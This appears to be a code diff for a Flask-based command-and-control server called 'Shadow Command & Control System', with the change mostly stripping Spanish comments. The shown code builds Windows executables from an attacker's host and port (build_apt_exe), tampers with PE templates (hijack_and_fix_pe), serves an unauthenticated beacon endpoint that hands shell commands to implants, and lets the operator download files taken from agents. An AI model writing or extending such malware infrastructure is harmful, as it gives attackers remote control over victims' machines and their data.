@@ -2,10 +2,9 @@ from flask import Flask, render_template, request, send_file, jsonify, session, 
 import base64, io, os, uuid, struct, subprocess, datetime, json, pefile, sys
 
 app = Flask(__name__)
-app.secret_key = os.urandom(24) # Clave para cifrar las cookies de sesión
+app.secret_key = os.urandom(24) 
 agents = {}
 
-# --- Configuración del Banner ---
 BANNER = r"""
    _____ ____  _____   ______ ______ ______ ____ 
   / ___// __ \|__  /  / ____//_  __// ____// __ \
@@ -16,7 +15,6 @@ BANNER = r"""
       >> Shadow Command & Control System <<
 """
 
-# --- Funciones de Backend (Manteniendo tu lógica original) ---
 
 def hijack_and_fix_pe(template_bytes, target_path):
     temp_tpl = f"tpl_{uuid.uuid4().hex}.exe"
@@ -123,11 +121,11 @@ def build_apt_exe(lhost, lport, template_file=None):
         if os.path.exists(cs_file): os.remove(cs_file)
         if os.path.exists(exe_file): os.remove(exe_file)
 
-# --- Rutas de Autenticación y Control ---
+
 
 @app.before_request
 def check_auth():
-    # Permitir acceso al login y a la API de beacons sin estar logueado
+
     allowed = ['login', 'static', 'beacon']
     if 'authenticated' not in session and request.endpoint not in allowed:
         return redirect(url_for('login'))
@@ -154,7 +152,7 @@ def generate():
 
 @app.route('/api/v1/beacon', methods=['POST'])
 def beacon():
-    # Esta ruta NO requiere autenticación para que los beacons puedan conectar
+   
     data = request.json
     if not data: return "shell||noop"
     aid = data.get('id')
@@ -194,10 +192,10 @@ def download_file(aid, fn):
         return send_file(io.BytesIO(base64.b64decode(agents[aid]["files"][fn])), as_attachment=True, download_name=fn)
     return "Error", 404
 
-# --- Ejecución ---
+
 
 if __name__ == '__main__':
-    # Capturar contraseña de los argumentos
+    
     if len(sys.argv) < 2:
         print(f"\033[1;31m[!] Error: Debes especificar una contraseña.\nUso: python3 app.py <password>\033[0m")
         sys.exit(1)
